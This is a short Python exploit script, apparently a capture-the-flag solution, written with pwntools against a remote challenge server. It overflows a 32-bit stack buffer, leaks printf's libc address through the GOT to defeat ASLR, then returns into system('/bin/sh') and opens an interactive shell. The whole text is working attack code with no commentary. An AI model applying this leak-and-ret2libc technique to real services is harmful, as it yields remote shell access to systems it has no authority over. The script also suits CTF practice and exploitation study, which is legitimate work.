from pwn import *

r = remote('shell.2019.nactf.com', 31283)
libc = ELF('./libc.so.6')

r.recvuntil('Type something>')

printf_plt = 0x8049030
printf_got = 0x804c00c
vuln = 0x08049192

payload = 'A' * 76 + p32(printf_plt) + p32(vuln) + p32(printf_got)
r.sendline(payload)

print(r.recvuntil(p32(printf_got)))
leak = r.recv(4)
printf_libc = u32(leak)
print('printf@libc: ', hex(printf_libc))

libc.address = printf_libc - libc.symbols['printf']
bin_sh = libc.search('/bin/sh').next()
system = libc.symbols['system']

payload = 'A' * 76 + p32(system) + 'AAAA' + p32(bin_sh)
r.sendline(payload)
r.recv()

r.interactive()
r.close()
